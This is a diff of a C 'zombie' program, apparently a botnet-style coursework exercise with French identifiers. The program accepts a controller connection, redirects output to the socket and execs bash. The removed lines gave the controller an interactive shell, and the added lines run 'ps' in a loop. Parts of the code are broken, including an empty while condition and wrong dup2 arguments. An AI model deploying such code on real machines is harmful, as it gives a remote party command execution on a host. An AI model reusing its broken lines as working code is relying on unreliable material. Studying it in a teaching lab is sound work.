@@ -9,6 +9,14 @@
 #include "info.h"
 #include "reseau.h"
 
+volatile sig_atomic_t end = 0;
+
+void endHandler(int sig)
+{
+  end = 1;
+}
+
+/*
 char* programme_inoffensif(char* commande) 
 {
     char* rep = malloc(100 * sizeof(char));
@@ -32,19 +40,21 @@ char* programme_inoffensif(char* commande)
 
     free(rep);
     return rep;
-}
+}*/
 
-void run(void* sockfdController){
-    while(){
+void zombieFils(void* sockfdController){
+    while(!end){
         int* sockfd = sockfdController;
-        dup2(sockfd, STDOUT_FILENO);
-        dup2(sockfd, STDERR_FILENO);
-        sexecl("/bin/bash", "bash", "-i", NULL);
-        dup2(0,sockfd);
+        dup2(*sockfd, STDOUT_FILENO);
+        dup2(*sockfd, STDERR_FILENO);
+        sexecl("/bin/bash","-c", "ps", NULL);
+        dup2(STDOUT_FILENO,*sockfd);
     }
 }
 
 int main(int argc, char *argv[]){
+    ssigaction(SIGINT, endHandler);
+
     int sockfd = initSocketZombie();
 
     int sockfdController;
@@ -55,10 +65,9 @@ int main(int argc, char *argv[]){
         sockfdController = saccept(sockfd);
         printf("Connexion établie\n");
 
-        int pid_child = fork_and_run1(run, sockfdController);
+        fork_and_run1(zombieFils, &sockfdController);
 
     }
-
     sclose(sockfdController);
     return 0;
     
